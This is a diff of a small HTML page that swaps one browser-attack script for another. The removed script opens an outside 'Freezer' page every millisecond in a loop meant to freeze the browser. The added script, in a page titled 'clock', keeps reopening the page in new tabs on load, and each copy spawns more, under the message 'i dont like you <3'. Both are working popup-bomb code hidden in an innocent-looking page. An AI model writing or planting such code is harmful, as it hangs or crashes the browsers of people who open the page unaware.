@@ -1,26 +1,48 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Open/Close Loop</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>clock</title>
+    <script>
+        // Initialize variables
+        let instances = [];
+        let isMaster = false;
+
+        function openInstances() {
+            if (instances.length < 3) {
+                const newWindow = window.open(window.location.href, "_blank"); // Opens self in a new tab/window
+                instances.push(newWindow);
+                newWindow.onbeforeunload = function () {
+                    instances = instances.filter(inst => inst !== newWindow);
+                    checkAndOpen();
+                };
+            }
+        }
+
+        function checkAndOpen() {
+            // Check if we need to open a new instance
+            if (instances.length < 3) {
+                openInstances();
+            } else {
+                window.open("about:blank", "_blank");
+            }
+        }
+
+        window.onload = function () {
+            if (instances.length === 0) {
+                openInstances();
+                isMaster = true;
+            }
+            // Listen for messages from other windows
+            window.addEventListener("message", (event) => {
+                console.log("Received message:", event.data);
+                // Optionally handle messages here
+            });
+        };
+    </script>
 </head>
 <body>
-<script>
-    // Function to handle the open/close cycle
-    function windowCycle() {
-        // Open new window
-        const newWindow = window.open('https://darakof.github.io/Freezer', '_blank');
-        
-        // Close the new window after 250 milliseconds
-        if (newWindow) {
-            newWindow.document.write('<script>setTimeout(() => window.close(), 250)<\/script>');
-        }
-        
-        // Repeat the cycle every 1 millisecond
-        setTimeout(windowCycle, 1);
-    }
-
-    // Start the initial cycle
-    windowCycle();
-</script>
+    <h1>i dont like you <3</h1>
 </body>
 </html>
